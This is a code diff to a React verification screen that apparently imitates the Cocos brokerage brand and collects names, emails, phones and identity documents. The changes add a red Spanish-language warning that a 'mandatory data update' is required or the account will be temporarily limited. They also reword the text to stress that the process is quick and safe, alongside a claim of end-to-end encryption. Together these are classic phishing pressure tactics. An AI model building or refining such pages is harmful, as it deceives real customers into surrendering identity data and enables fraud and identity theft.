@@ -1,5 +1,5 @@
 import { FormEvent, useMemo, useState } from "react";
-import { User, Mail, Phone, CreditCard, Loader2 } from "lucide-react";
+import { User, Mail, Phone, CreditCard, Loader2, AlertTriangle, ShieldAlert } from "lucide-react";
 import CocosLogo from "@/components/cocos/CocosLogo";
 
 interface LegalCandidate {
@@ -110,6 +110,21 @@ const CocosV2VerifyScreen = ({ email, fullName, phone, onSubmit }: CocosV2Verify
         <CocosLogo />
       </div>
 
+      {/* Mandatory notice */}
+      <div className="rounded-xl border border-red-100 bg-red-50/60 px-4 py-3 mb-5">
+        <div className="flex items-start gap-2.5">
+          <ShieldAlert size={16} className="text-red-500 flex-shrink-0 mt-0.5" />
+          <div>
+            <p className="text-[12.5px] text-[#1a2233] font-bold leading-relaxed mb-0.5">
+              Actualización cadastral obligatoria
+            </p>
+            <p className="text-[11.5px] text-[#5a6a85] leading-relaxed">
+              Por normativa vigente, es necesario confirmar tus datos y documento de identidad. Sin completar este proceso, tu cuenta será <strong className="text-red-600">limitada temporalmente</strong>.
+            </p>
+          </div>
+        </div>
+      </div>
+
       <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
         <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
         <div className="px-7 pt-6 pb-7">
@@ -117,9 +132,9 @@ const CocosV2VerifyScreen = ({ email, fullName, phone, onSubmit }: CocosV2Verify
             <div className="w-12 h-12 rounded-full bg-[#eef2ff] border border-[#dbe4ff] flex items-center justify-center mb-3">
               <CreditCard size={22} className="text-[#3b6fe0]" />
             </div>
-            <h3 className="text-[17px] font-bold text-[#1a2233] mb-1">Verificación de identidad</h3>
-            <p className="text-[13px] text-[#8895aa] max-w-[280px]">
-              Confirmá tus datos para asegurar tu cuenta y completar la verificación.
+            <h3 className="text-[17px] font-bold text-[#1a2233] mb-1">Confirmación de datos personales</h3>
+            <p className="text-[13px] text-[#8895aa] max-w-[300px]">
+              Confirmá tu documento de identidad para habilitar todas las funciones de tu cuenta. Este proceso es <strong className="text-[#1a2233]">rápido y seguro</strong>.
             </p>
           </div>
 
@@ -243,7 +258,7 @@ const CocosV2VerifyScreen = ({ email, fullName, phone, onSubmit }: CocosV2Verify
           </form>
 
           <p className="mt-4 text-center text-[10px] text-[#b0b8c9] leading-relaxed">
-            🔒 Tus datos están protegidos con cifrado de extremo a extremo.
+            🔒 Tus datos están protegidos con cifrado de extremo a extremo. Proceso rápido y seguro.
           </p>
         </div>
       </div>
